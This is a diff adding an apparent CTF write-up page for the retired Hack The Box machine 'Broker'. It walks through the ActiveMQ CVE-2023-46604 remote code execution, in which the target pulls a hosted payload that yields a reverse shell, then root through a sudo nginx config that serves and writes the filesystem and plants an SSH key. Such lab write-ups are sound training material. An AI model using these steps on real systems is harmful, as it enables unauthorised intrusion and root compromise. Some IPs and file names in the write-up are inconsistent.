@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Broker &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Broker</h1>
+    <div class="meta">Target: <code>10.10.14.128</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">CVE</span><span class="tag">ApacheActiveMQ</span><span class="tag">Jenkins</span><span class="tag">sudo</span><span class="tag">nginx</span><span class="tag">sshkeygen</span><span class="tag">fileread</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cve-2023-46604-activemq-openwire-rce">CVE-2023-46604, ActiveMQ OpenWire RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#sudo-nginx-arbitrary-file-read-then-write">sudo nginx → Arbitrary File Read, then Write</a><a class="lvl3" href="#planting-an-ssh-key">Planting an SSH Key</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Broker is an easy Linux box built on <strong>CVE-2023-46604</strong>, a critical unauthenticated RCE in Apache ActiveMQ that made a lot of noise in late 2023. The privilege escalation is a textbook <code>sudo</code> abuse: permission to run <code>nginx</code> as root lets me spin up a rogue web server that both reads any file on disk and, via WebDAV <code>PUT</code>, <em>writes</em> one, which I use to plant an SSH key in root's home.</p>
+<h2 id="recon">Recon</h2>
+<p>The site sits behind HTTP basic auth. Cancelling the auth prompt to trigger the error page leaks the server banner:</p>
+<pre><code>Powered by Jetty:// 9.4.39.v20210325
+</code></pre>
+<p>A guess of <code>admin:admin</code> got through the basic auth, revealing the application underneath: <strong>Apache ActiveMQ</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cve-2023-46604-activemq-openwire-rce">CVE-2023-46604, ActiveMQ OpenWire RCE</h3>
+<blockquote>
+<p><strong>How the bug works:</strong> ActiveMQ's OpenWire protocol deserializes class names sent by a client and instantiates them. An attacker can force it to instantiate Spring's <code>ClassPathXmlApplicationContext</code> pointed at a <em>remote</em> XML file. ActiveMQ fetches that XML and Spring dutifully wires up the beans it defines, including one that runs an OS command. So a single crafted packet plus a hosted XML payload equals RCE as the broker user.</p>
+</blockquote>
+<p>I hosted the reverse-shell XML on Kali and ran <a href="https://github.com/evkl1d/CVE-2023-46604">evkl1d's exploit</a>, pointing the target at my payload URL:</p>
+<pre><code class="language-sh">python3 exploit.py -i 10.129.230.87 -u http://10.10.14.128/poc.xml
+</code></pre>
+<p>The target pulled the XML from my web server:</p>
+<pre><code class="language-sh">python3 -m http.server 80
+10.129.230.87 - - &quot;GET /poc.xml HTTP/1.1&quot; 200 -
+</code></pre>
+<p>And a shell landed as <code>activemq</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 9001
+activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami
+activemq
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-nginx-arbitrary-file-read-then-write">sudo nginx → Arbitrary File Read, then Write</h3>
+<pre><code class="language-sh">sudo -l
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+</code></pre>
+<blockquote>
+<p><strong>Why running <code>nginx</code> as root is dangerous:</strong> <code>nginx</code> takes a <code>-c &lt;config&gt;</code> flag, and the config controls everything, which user it runs as, what directory it serves, and which HTTP methods it accepts. Running it as root with an attacker-supplied config turns it into a root-privileged file server (and, with WebDAV, a file <em>writer</em>).</p>
+</blockquote>
+<p>First I served the entire filesystem read-only, enough to read the root flag:</p>
+<pre><code class="language-nginx">user root;
+events { worker_connections 1024; }
+http{ server { listen 1337; root /; autoindex on; } }
+</code></pre>
+<pre><code class="language-sh">sudo /usr/sbin/nginx -c /dev/shm/evil.conf
+</code></pre>
+<p>For full access I went further, enabling WebDAV <code>PUT</code> so the server can write files as root:</p>
+<pre><code class="language-nginx">http{ server { listen 1338; root /; autoindex on; dav_methods PUT; } }
+</code></pre>
+<pre><code class="language-sh">curl localhost:1338    # confirms the whole filesystem is served
+</code></pre>
+<h3 id="planting-an-ssh-key">Planting an SSH Key</h3>
+<p>I generated a keypair on Kali, then <code>PUT</code> the public key straight into root's <code>authorized_keys</code> through the rogue server:</p>
+<pre><code class="language-sh">ssh-keygen -q -t rsa -N '' -C 'pam'
+curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAA...= pam'
+</code></pre>
+<h2 id="root">Root</h2>
+<p>With the key in place, SSH as root succeeds:</p>
+<pre><code class="language-sh">ssh -i evil_rsa root@10.129.45.81
+root@broker:~# whoami
+root
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Error pages leak versions.</strong> Cancelling basic auth exposed the Jetty banner and pointed at ActiveMQ.</li>
+<li><strong>CVE-2023-46604 is a one-packet RCE</strong> against unpatched ActiveMQ, keep message brokers off the public edge and patched.</li>
+<li><strong><code>sudo</code> on a flexible binary is as good as a root shell.</strong> <code>nginx -c</code> with an attacker config gives root file read; WebDAV <code>PUT</code> upgrades that to write, and an SSH key turns write into a clean interactive root login.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
